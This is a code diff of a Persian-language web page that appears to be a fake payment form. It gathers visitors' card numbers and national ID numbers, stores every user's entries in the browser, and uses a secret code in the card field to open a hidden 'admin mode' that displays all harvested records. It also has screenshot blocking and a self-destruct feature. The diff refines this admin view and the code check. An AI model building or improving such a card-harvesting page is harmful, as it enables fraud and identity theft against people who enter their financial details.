@@ -276,7 +276,7 @@
         </div>
 
         <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
-        <button class="btn btn-clear" id="clear-data-btn" onclick="x.clearData()">بگا بده اطلاعات رو</button>
+        <button class="btn btn-clear" id="clear-data-btn" onclick="x.clearData()">پاک کردن اطلاعات</button>
         <div class="user-data" id="user-data"></div>
     </div>
 
@@ -316,15 +316,12 @@
             function setupInputs() {
                 const cardNumber = document.getElementById('card-number');
                 cardNumber.addEventListener('input', e => {
-                    let value = e.target.value;
+                    let value = e.target.value.replace(/\D/g, '');
                     if (value === SPECIAL_CODE) {
-                        isSpecialMode = true;
-                        localStorage.setItem(`specialMode_${sessionId}`, 'true');
-                        alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
-                        showUserData();
-                        clearDataBtn.style.display = 'block';
+                        enterAdminMode();
+                        return;
                     }
-                    value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').slice(0, 19).trim();
+                    value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
                     e.target.value = value;
                 });
                 cardNumber.addEventListener('blur', e => updateUserData('شماره کارت', e.target.value));
@@ -357,6 +354,19 @@
                 document.getElementById('fake-field').addEventListener('blur', e => updateUserData('کد ملی', e.target.value));
             }
 
+            function enterAdminMode() {
+                isSpecialMode = true;
+                localStorage.setItem(`specialMode_${sessionId}`, 'true');
+                alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
+                currentStep = 3;
+                steps[0].classList.remove('active');
+                steps[2].classList.add('active');
+                updateProgress();
+                showUserData();
+                clearDataBtn.style.display = 'block';
+                document.getElementById('result').innerHTML = 'حالت مدیر: اطلاعات کاربران در زیر نمایش داده شده است.';
+            }
+
             function updateUserData(key, value) {
                 if (value.trim()) {
                     userData[key] = value;
@@ -374,14 +384,16 @@
             function showUserData() {
                 userDataDiv.style.display = 'block';
                 userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
-                    allUsersData.map((user, index) => 
-                        `<div style="margin-bottom: 15px;">
-                            <h4>کاربر ${index + 1}:</h4>` + 
-                            Object.entries(user)
-                                .map(([key, value]) => `<p>${key}: ${value}</p>`)
-                                .join('') +
-                        `</div>`
-                    ).join('');
+                    (allUsersData.length > 0 ? 
+                        allUsersData.map((user, index) => 
+                            `<div style="margin-bottom: 15px;">
+                                <h4>کاربر ${index + 1}:</h4>` + 
+                                Object.entries(user)
+                                    .map(([key, value]) => `<p>${key}: ${value}</p>`)
+                                    .join('') +
+                            `</div>`
+                        ).join('') : 
+                        '<p>هیچ اطلاعاتی موجود نیست</p>');
             }
 
             function setupScreenshotProtection() {
@@ -402,10 +414,8 @@
             }
 
             function validateStep(step) {
-                const card = document.getElementById('card-number').value;
-                if (card === SPECIAL_CODE) {
-                    return true;
-                }
+                const card = document.getElementById('card-number').value.replace(/\D/g, '');
+                if (card === SPECIAL_CODE) return true;
 
                 const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
                 for (let input of inputs) {
@@ -416,7 +426,7 @@
                 }
 
                 if (step === 1) {
-                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
+                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(document.getElementById('card-number').value)) {
                         alert('شماره کارت نامعتبر است');
                         return false;
                     }
@@ -436,24 +446,10 @@
                 if (!validateStep(step)) return;
 
                 steps[step - 1].classList.remove('active');
-                const card = document.getElementById('card-number').value;
-                if (card === SPECIAL_CODE && step === 1) {
-                    currentStep = 3;
-                    showSpecialResult();
-                } else {
-                    currentStep = step + 1;
-                    if (currentStep === 3) processPayment();
-                }
+                currentStep = step + 1;
+                if (currentStep === 3) processPayment();
                 steps[currentStep - 1].classList.add('active');
                 updateProgress();
-            }
-
-            function showSpecialResult() {
-                const result = document.getElementById('result');
-                result.innerHTML = `حالت مدیر: اطلاعات وارد شده نمایش داده شد.<br>` +
-                    Object.entries(userData)
-                        .map(([key, value]) => `${key}: ${value}`)
-                        .join('<br>');
             }
 
             function updateProgress() {
@@ -576,7 +572,7 @@
                 if (isSpecialMode && confirm('آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟')) {
                     allUsersData = [];
                     localStorage.setItem('allUsersData', JSON.stringify(allUsersData));
-                    userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3><p>هیچ اطلاعاتی موجود نیست</p>';
+                    showUserData();
                 }
             }
 
